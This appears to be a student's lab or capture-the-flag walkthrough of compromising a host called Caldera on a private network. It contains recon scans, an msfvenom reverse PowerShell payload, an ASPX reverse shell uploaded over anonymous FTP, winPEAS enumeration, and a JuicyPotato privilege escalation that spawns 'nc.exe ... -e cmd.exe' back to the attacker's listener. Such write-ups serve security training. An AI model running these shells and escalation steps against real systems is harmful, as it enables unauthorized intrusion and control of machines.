# Caldera 192.168.2.4
## Andrea Zonnekus 18758119

nbtscan -r 192.168.2.0/24

![](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.001.png)

sudo nmap --vv -Pn -sT -O -sV 192.168.2.4 --open -oA host\_scan --script="default or safe" --proxies socks4://127.0.0.1:9050

![Graphical user interface, text, application

Description automatically generated](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.002.png)

gobuster dir -u 192.168.2.4 -w /usr/share/dirb/wordlists/big.txt -o http\_enum -x php,html,js,txt

![A screenshot of a computer

Description automatically generated with medium confidence](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.003.png)

sudo nmap -sV -sT -sC -Pn -p 445 192.168.2.4 -script="smb-os-discovery" -oN smb

![](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.004.png)

msfvenom -p cmd/windows/reverse\_powershell LHOST=10.8.0.106 LPORT=4444 -o shell

![Text

Description automatically generated](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.005.png)

sudo nmap -sV -sT -sC -Pn -p 21 192.168.2.4 --script=\*ftp\* -oN ftp

![](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.006.png)

can see there is aspnet\_client – using aspx for sure

< do a bunch of things to try and exploit smb >

<https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx>

![Background pattern

Description automatically generated](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.007.png)

wget <https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx>

![Graphical user interface

Description automatically generated with medium confidence](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.008.png)



wget <https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat>

![Text

Description automatically generated](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.009.png)

can’t put files right now but I can check this later

nmap -p 554 -sV -T5 192.168.2.4 --script=rtsp\* -oN rtsp

![](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.010.png)

cant enum more information on this, next port on the list

nc 192.168.2.4 2100

![Text

Description automatically generated](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.011.png)

non-default port for this, interesting

nmap -p 2100 -sV 192.168.2.4 --script=ftp\* -oN ftp\_non\_def

![Text

Description automatically generated](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.012.png)

![Graphical user interface

Description automatically generated](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.013.png)



check the other ports while that works

<https://www.speedguide.net/port.php?port=19>

![](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.014.png)

ftp 192.168.2.4 -p 2100

put winPEAS.bat

put shell.aspx

![A screenshot of a computer screen

Description automatically generated with medium confidence](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.015.png)

check, nothing happens

nmap -p 443,8080 192.168.2.4

![Text

Description automatically generated](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.016.png)

nmap -p 50000- 192.168.2.4 –open

![Text

Description automatically generated](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.017.png)



nc 192.168.2.4 61240

![](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.018.png)

<http://192.168.2.4:61240/shell.aspx>

![Graphical user interface, application, website

Description automatically generated](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.019.png)

![Text

Description automatically generated](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.020.png)

where -r c:\ winPEAS.bat

![Text

Description automatically generated](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.021.png)

winPEAS.bat

![Graphical user interface

Description automatically generated](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.022.png)



interesting out

![](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.023.png)

![](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.024.png)

![A screenshot of a computer

Description automatically generated with medium confidence](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.025.png)

ftp anonymous@192.168.2.4 -p 2100

![](Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.026.png)

nc -lvnp 1234

nc -lvnp 4444

![](caldera_steps/Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.027.png)



where -r c:\ shell.aspx (cause lazy)

![](caldera_steps/Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.028.png)

dir

![](caldera_steps/Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.029.png)

jp.exe -t u -p "nc.exe" -a "10.8.0.106 4444 -e cmd.exe" -l 6666

![](caldera_steps/Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.030.png)

whoami

![](caldera_steps/Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.031.png)

del jc.exe jp.exe nc.exe shell.aspx

![](caldera_steps/Aspose.Words.cd9beb05-7a3e-44e5-af4b-aa1f947d17da.032.png)

forgot I was actually was nc at the time haha
